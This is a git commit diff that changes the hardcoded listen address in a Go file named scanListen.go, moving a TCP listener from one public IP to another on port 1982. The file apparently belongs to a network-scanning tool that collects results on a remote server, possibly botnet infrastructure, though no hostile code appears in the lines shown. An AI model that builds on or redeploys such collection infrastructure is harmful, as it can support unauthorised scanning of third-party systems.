a3105142132b65c44fb750906db584731977dde5
Rebrithed-Reaperr <85047722+Rebrithed-Reaperr@users.noreply.github.com>
2023-07-16 14:03:21 -0500

    Update scanListen.go

--- scanListen.go
+++ scanListen.go
@@ -11,7 +11,7 @@ import (
 )
  
 func main() {
-    l, err := net.Listen("tcp", "173.232.146.173:1982")
+    l, err := net.Listen("tcp", "5.181.80.48:1982")
     if err != nil {
         fmt.Println(err)
         return
